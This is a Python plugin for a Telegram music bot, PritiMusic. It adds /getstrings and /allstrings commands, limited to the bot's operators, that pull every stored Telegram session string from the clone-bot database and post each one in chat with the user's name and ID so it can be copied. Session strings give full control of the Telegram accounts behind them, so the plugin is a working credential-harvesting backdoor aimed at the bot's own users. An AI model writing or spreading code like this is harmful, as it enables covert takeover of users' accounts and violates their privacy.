import asyncio
from pyrogram import filters
from PritiMusic import app
from PritiMusic.misc import SUDOERS
from PritiMusic.utils.database import clonebotdb 

# ✅ COMMAND: /getstrings
# Sirf String Session Text mein aayega
@app.on_message(filters.command(["getstrings", "allstrings"]) & SUDOERS)
async def get_sessions_text(client, message):
    
    status_msg = await message.reply_text("🔄 **Sessions dhoondh raha hoon...**")
    count = 0

    try:
        # Database loop
        async for user_data in clonebotdb.find():
            
            user_id = user_data.get("user_id")
            name = user_data.get("assistant_name", "Unknown")
            string = user_data.get("session_string")
            
            # Sirf tab bhejo agar String Valid hai (Empty nahi hai)
            if string and len(string) > 50:
                count += 1
                
                # Format: Name, ID aur fir String (Copy karne ke liye <code> tag)
                text = (
                    f"👤 **User:** {name} (`{user_id}`)\n"
                    f"👇 **String Session:**\n\n"
                    f"<code>{string}</code>"
                )
                
                # Message bhejo
                await message.reply_text(text)
                
                # ⚠️ FloodWait se bachne ke liye thoda rukna padega
                await asyncio.sleep(1.5)

        if count == 0:
            await status_msg.edit_text("❌ Koi valid session nahi mila database mein.")
        else:
            await status_msg.edit_text(f"✅ **Total {count} String Sessions bhej diye gaye hain.**")

    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)}")